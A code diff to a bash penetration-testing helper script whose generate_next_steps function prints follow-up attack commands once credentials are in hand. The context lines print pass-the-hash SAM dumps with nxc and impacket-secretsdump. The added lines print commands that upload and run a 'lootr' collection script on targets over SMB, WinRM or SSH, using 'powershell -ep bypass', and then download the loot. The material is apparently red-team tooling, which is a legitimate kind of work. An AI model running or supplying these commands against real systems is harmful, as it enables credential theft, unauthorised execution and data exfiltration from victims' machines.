@@ -475,6 +475,14 @@ generate_next_steps() {
                 echo "# SAM dump:"
                 echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --sam"
                 echo "  impacket-secretsdump -hashes ${LM_NT_HASH} ${smb_u}@${smb_t}"
+                echo ""
+                echo "# Full AD recon (if domain-joined):"
+                local dom_smb="${DOMAIN:-<DOMAIN>}"
+                echo "  ./adr.sh -d ${dom_smb} -u ${smb_u} -H :${NT_HASH} -dc ${smb_t}"
+                echo ""
+                echo "# Post-exploit collection (drop and run on target):"
+                echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                echo "  nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             else
                 local q_pass; printf -v q_pass '%q' "$AUTH_PASS"
                 echo "  impacket-psexec ${smb_u}:${q_pass}@${smb_t}"
@@ -484,6 +492,14 @@ generate_next_steps() {
                 echo "# SAM dump:"
                 echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --sam"
                 echo "  impacket-secretsdump ${smb_u}:${q_pass}@${smb_t}"
+                echo ""
+                echo "# Full AD recon (if domain-joined):"
+                local dom_smb_p="${DOMAIN:-<DOMAIN>}"
+                echo "  ./adr.sh -d ${dom_smb_p} -u ${smb_u} -p '${AUTH_PASS}' -dc ${smb_t}"
+                echo ""
+                echo "# Post-exploit collection:"
+                echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                echo "  nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             fi
         fi
 
@@ -499,6 +515,13 @@ generate_next_steps() {
                 local q_wpass; printf -v q_wpass '%q' "$AUTH_PASS"
                 echo "  evil-winrm -i ${wrm_t} -u ${wrm_u} -p ${q_wpass}"
             fi
+            echo ""
+            echo "# Post-exploit collection via WinRM shell:"
+            echo "  # After connecting with evil-winrm:"
+            echo "  upload ~/scripts/lootr.ps1 C:\\Windows\\Temp\\lootr.ps1"
+            echo "  powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot"
+            echo "  download C:\\Windows\\Temp\\loot\\summary.txt"
+            echo "  download C:\\Windows\\Temp\\loot\\attack_commands.txt"
         fi
 
         # RDP
@@ -527,6 +550,13 @@ generate_next_steps() {
             echo ""
             echo "# SSH session:"
             echo "  ssh ${ssh_u}@${ssh_t}"
+            echo ""
+            echo "# Enumerate for privilege escalation:"
+            echo "  # Once on target — run escalatr.sh (from Kali, if reachable):"
+            echo "  ./escalatr.sh -t ${ssh_t} -u ${ssh_u} -p '${AUTH_PASS:-<PASS>}'"
+            echo "  # Or drop lootr.sh directly on target:"
+            echo "  scp ~/scripts/lootr.sh ${ssh_u}@${ssh_t}:/tmp/lootr.sh"
+            echo "  ssh ${ssh_u}@${ssh_t} 'bash /tmp/lootr.sh'"
         fi
 
         # MSSQL
